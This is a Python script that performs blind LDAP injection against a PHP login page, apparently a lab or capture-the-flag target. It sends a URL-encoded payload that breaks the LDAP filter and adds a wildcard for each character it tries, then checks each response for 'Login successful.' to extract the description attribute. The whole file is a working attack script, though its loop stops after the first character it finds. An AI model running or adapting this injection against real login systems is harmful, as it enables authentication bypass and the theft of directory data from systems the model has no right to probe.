import requests
import re
import string

# Configuration
url = 'http://94.237.51.81:53691/index.php'  # Replace with the actual URL
username = 'admin%29%28%7C%28description%3D'
password = 'invalid%29'
tegex_string = 'Login successful.'  # Replace with the actual string you are searching for

# Define the headers to add to the request
headers = {
    'Host': '94.237.51.81:53691',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.237.51.81:53691',
    'Connection': 'keep-alive',
    'Referer': 'http://94.237.51.81:53691/',
    'Cookie': 'PHPSESSID=5tenj5k095oummmvenqgpa9sku',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i'
}

def send_request(payload):
    response = requests.post(url, data=payload, headers=headers)
    return response.text

def search_response(response_text, search_string):
    if re.search(search_string, response_text):
        print(f"Found string '{search_string}' in the response.")
        return True
    else:
        print(f"Did not find string '{search_string}' in the response.")
        return False

def brute_force_ldap(characters):
    found_string = ''
    for char in characters:
        payload = f'username={username}{char}*&password={password}'
        response_text = send_request(payload)
        print(f"Response for character '{char}':\n{response_text}\n")
        if search_response(response_text, tegex_string):
            found_string += char
            print(f"Found successful login with character: {char}")
            print(f"Found string: {found_string}")
            break
        else:
            print(f"No successful login with character: {char}")

if __name__ == '__main__':
    # Define the characters to iterate over
    lowercase_letters = string.ascii_lowercase
    uppercase_letters = string.ascii_uppercase
    digits = string.digits
    special_characters = "!@#$%^&*()-_=+[]{}|;:,.<>?/`~"

    # Combine all character sets
    all_characters = lowercase_letters + uppercase_letters + digits + special_characters

    brute_force_ldap(all_characters)